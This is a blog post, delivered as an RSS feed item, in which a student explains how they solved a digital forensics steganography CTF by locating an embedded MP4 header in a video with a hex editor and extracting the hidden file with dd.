            <content:encoded><![CDATA[<p>During Lab 2 of Digital Forensics course, we explored the topic of <strong>Steganography</strong>.
As part of the session, our instructor introduced a CTF-style challenge and offered bonus points to anyone who could successfully retrieve the flag.</p>
<!-- -->
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="solution">Solution<a href="https://solivaquaant.github.io/my-small-blog/blog/nt334-lab2-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution" translate="no">​</a></h2>
<p>We were provided with a video file and a hint: <em>"Look for the hex signature of a file that might be hidden inside."</em></p>
<p>To begin, I opened the video file using <strong>HxD</strong>, a hex editor.
Upon inspection, I noticed that the file header identified it as an <code>ftypisom</code> format, which is a common container signature for MP4 videos.</p>
<p>To search for embedded file signatures, I used the <strong>Search</strong> function (<code>Ctrl + F</code>) in HxD.
Under <strong>Text-string</strong>, I looked for typical MP4 box types like:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">"ftyp", "mdat", "moov", "pnot", "udta", "uuid", "moof", "free", ...</span><br></span></code></pre></div></div>
<p>Alternatively, I could switch to <strong>Hex-values</strong> mode and search for hex representations of known file headers.</p>
<p>After some scanning, I found the following hex sequence:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">66 74 79 70 6D 70 34 32</span><br></span></code></pre></div></div>
<p>This corresponds to the ASCII string <code>ftypmp42</code>, indicating the header of an <strong>MP4 (version 2)</strong> file.
This signature was located at <strong>offset <code>0x1D62C78</code></strong>.</p>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/offset-6cb5964b27134a84fc7d0bdf547af73c.png" style="width:100%;height:auto"></div>
<p>To extract the embedded MP4 file, I first converted the offset to decimal: 0x1D62C78 = 30813300.</p>
<p>Then, using the <code>dd</code> command in a Unix-like environment, I extracted the hidden file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dd if=video-challenge.mp4 of=output.mp4 bs=1 skip=30813300</span><br></span></code></pre></div></div>
<p>Opening the extracted <code>output.mp4</code> revealed the flag for the challenge.</p>
<div style="width:80%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/flag-15f326ca74a2aa718bc2357efc7d8831.png" style="width:100%;height:auto"></div>
<p>This exercise demonstrated how steganographic techniques can be used to conceal full files within other media, and how basic hex analysis combined with known file signatures can help uncover them.</p>
<h1>Flag</h1>
<blockquote>
<p><code>inseclab{b3h1nd_th3_sc3n3}</code></p>
</blockquote>]]></content:encoded>
            <category>Steganography</category>
            <category>CTF</category>
        </item>
    </channel>
</rss>